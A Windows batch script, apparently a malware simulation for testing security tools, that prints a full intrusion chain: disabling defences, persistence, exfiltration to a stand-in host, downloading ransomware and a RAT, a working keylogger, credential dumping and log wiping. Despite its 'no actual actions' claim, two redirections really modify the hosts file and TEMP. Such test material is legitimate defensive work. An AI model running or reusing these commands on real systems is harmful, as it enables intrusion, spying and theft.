@echo off
REM ================================================================
REM MALICIOUS BATCH SCRIPT SIMULATION (FOR TESTING PURPOSES ONLY)
REM This script simulates malicious behavior but does not actually
REM perform any harmful actions.
REM ================================================================

title System Maintenance
color 0a
echo.
echo ================================================================
echo                SYSTEM MAINTENANCE UTILITY
echo                   (SIMULATION ONLY)
echo ================================================================
echo.
echo This is a simulated malicious batch file for testing security tools.
echo No actual malicious actions will be performed.
echo.
echo Press any key to continue...
pause > nul

REM Simulate disabling security features
echo.
echo [*] Checking system security status...
timeout /t 2 /nobreak > nul
echo [*] Would attempt to disable Windows Defender...
echo     REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f
echo [*] Would attempt to disable firewall...
echo     netsh advfirewall set allprofiles state off
echo [*] Would attempt to disable UAC...
echo     REG ADD "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableLUA /t REG_DWORD /d 0 /f
echo [*] Would attempt to disable Windows Update...
echo     net stop wuauserv
echo     sc config wuauserv start= disabled
echo [+] Security features would be disabled (simulated)
echo.
timeout /t 2 /nobreak > nul

REM Simulate persistence mechanisms
echo [*] Establishing persistence...
timeout /t 2 /nobreak > nul
echo [*] Would add startup registry key...
echo     REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v SystemService /t REG_SZ /d "%~f0" /f
echo [*] Would create scheduled task...
echo     schtasks /create /tn "System Maintenance" /tr "%~f0" /sc daily /st 12:00 /ru "SYSTEM" /f
echo [*] Would create WMI event subscription...
echo     wmic /namespace:"\\root\subscription" path __EventFilter create Name="SystemFilter", EventNameSpace="root\cimv2", QueryLanguage="WQL", Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
echo [*] Would modify hosts file...
echo     echo 127.0.0.1 security.windows.com >> %WINDIR%\System32\drivers\etc\hosts
echo [+] Persistence would be established (simulated)
echo.
timeout /t 2 /nobreak > nul

REM Simulate information gathering
echo [*] Gathering system information...
timeout /t 2 /nobreak > nul
echo [*] System information:
echo     Hostname: %COMPUTERNAME%
echo     Username: %USERNAME%
echo     OS: %OS%
echo     Windows Directory: %WINDIR%
echo     System Drive: %SYSTEMDRIVE%
echo     Processor Architecture: %PROCESSOR_ARCHITECTURE%
echo     Number of Processors: %NUMBER_OF_PROCESSORS%
echo [*] Would enumerate installed software...
echo     reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall /s
echo [*] Would enumerate running processes...
echo     tasklist /v
echo [*] Would enumerate network configuration...
echo     ipconfig /all
echo     netstat -ano
echo [*] Would enumerate user accounts...
echo     net user
echo [*] Would search for sensitive files...
echo     dir /s /b %USERPROFILE%\*.txt %USERPROFILE%\*.docx %USERPROFILE%\*.xlsx %USERPROFILE%\*.pdf
echo [+] System information would be gathered (simulated)
echo.
timeout /t 2 /nobreak > nul

REM Simulate data exfiltration
echo [*] Preparing for data exfiltration...
timeout /t 2 /nobreak > nul
echo [*] Would compress sensitive files...
echo     powershell -Command "Compress-Archive -Path '%USERPROFILE%\Documents' -DestinationPath '%TEMP%\data.zip'"
echo [*] Would encrypt data...
echo     powershell -Command "$key = [Convert]::ToBase64String([System.Text.Encoding]::ASCII.GetBytes('malicious-key')); $encrypted = ConvertTo-SecureString -String (Get-Content '%TEMP%\data.zip') -AsPlainText -Force | ConvertFrom-SecureString -Key ([Convert]::FromBase64String($key)); Set-Content '%TEMP%\data.enc' $encrypted"
echo [*] Would exfiltrate data...
echo     powershell -Command "Invoke-WebRequest -Uri 'http://malicious-server.com/exfil' -Method POST -InFile '%TEMP%\data.enc'"
echo [+] Data would be exfiltrated (simulated)
echo.
timeout /t 2 /nobreak > nul

REM Simulate downloading additional payloads
echo [*] Downloading additional payloads...
timeout /t 2 /nobreak > nul
echo [*] Would download keylogger...
echo     powershell -Command "Invoke-WebRequest -Uri 'http://malicious-server.com/keylogger.exe' -OutFile '%TEMP%\svchost.exe'"
echo [*] Would download ransomware...
echo     powershell -Command "Invoke-WebRequest -Uri 'http://malicious-server.com/ransomware.exe' -OutFile '%TEMP%\winlogon.exe'"
echo [*] Would download remote access trojan...
echo     powershell -Command "Invoke-WebRequest -Uri 'http://malicious-server.com/rat.exe' -OutFile '%TEMP%\explorer.exe'"
echo [*] Would execute payloads...
echo     start "" "%TEMP%\svchost.exe"
echo     start "" "%TEMP%\winlogon.exe"
echo     start "" "%TEMP%\explorer.exe"
echo [+] Additional payloads would be downloaded and executed (simulated)
echo.
timeout /t 2 /nobreak > nul

REM Simulate webcam access
echo [*] Accessing webcam...
timeout /t 2 /nobreak > nul
echo [*] Would capture webcam image...
echo     powershell -Command "$webcam = New-Object -ComObject WIA.DeviceManager; $device = $webcam.DeviceInfos.Item(1).Connect(); $image = $device.Items(1).Transfer(); $image.SaveFile('%TEMP%\webcam.jpg'); Invoke-WebRequest -Uri 'http://malicious-server.com/upload' -Method POST -InFile '%TEMP%\webcam.jpg'"
echo [+] Webcam would be accessed (simulated)
echo.
timeout /t 2 /nobreak > nul

REM Simulate keylogger
echo [*] Installing keylogger...
timeout /t 2 /nobreak > nul
echo [*] Would create keylogger script...
echo     echo $code = @'
echo     [DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)]
echo     public static extern short GetAsyncKeyState(int virtualKeyCode);
echo     '@
echo     echo Add-Type -MemberDefinition $code -Name 'Win32' -Namespace API
echo     echo while ($true) {
echo     echo   Start-Sleep -Milliseconds 40
echo     echo   for ($ascii = 9; $ascii -le 254; $ascii++) {
echo     echo     $state = [API.Win32]::GetAsyncKeyState($ascii)
echo     echo     if ($state -eq -32767) {
echo     echo       $key = [char]$ascii
echo     echo       $logfile = "$env:TEMP\keylog.txt"
echo     echo       $key | Out-File -FilePath $logfile -Append
echo     echo     }
echo     echo   }
echo     echo } > %TEMP%\keylogger.ps1
echo [*] Would start keylogger...
echo     powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File %TEMP%\keylogger.ps1
echo [+] Keylogger would be installed (simulated)
echo.
timeout /t 2 /nobreak > nul

REM Simulate credential theft
echo [*] Stealing credentials...
timeout /t 2 /nobreak > nul
echo [*] Would dump browser passwords...
echo     powershell -Command "Get-ChildItem -Path '$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data' -ErrorAction SilentlyContinue | Out-File '%TEMP%\browser_creds.txt'"
echo [*] Would dump Windows credentials...
echo     powershell -Command "rundll32.exe vaultcli.dll,VaultEnumerateVaults 0 0 | Out-File '%TEMP%\windows_creds.txt'"
echo [*] Would exfiltrate credentials...
echo     powershell -Command "Invoke-WebRequest -Uri 'http://malicious-server.com/creds' -Method POST -InFile '%TEMP%\browser_creds.txt'"
echo     powershell -Command "Invoke-WebRequest -Uri 'http://malicious-server.com/creds' -Method POST -InFile '%TEMP%\windows_creds.txt'"
echo [+] Credentials would be stolen (simulated)
echo.
timeout /t 2 /nobreak > nul

REM Simulate cleanup
echo [*] Cleaning up traces...
timeout /t 2 /nobreak > nul
echo [*] Would clear event logs...
echo     wevtutil cl System
echo     wevtutil cl Application
echo     wevtutil cl Security
echo [*] Would delete temporary files...
echo     del /f /q %TEMP%\*.* 2>nul
echo [*] Would clear command history...
echo     doskey /reinstall
echo     powershell -Command "Clear-History"
echo [+] Traces would be cleaned up (simulated)
echo.
timeout /t 2 /nobreak > nul

REM Simulation complete
echo.
echo ================================================================
echo                SIMULATION COMPLETE
echo ================================================================
echo.
echo This was a simulation for testing security tools.
echo No actual malicious actions were performed.
echo.
echo Press any key to exit...
pause > nul
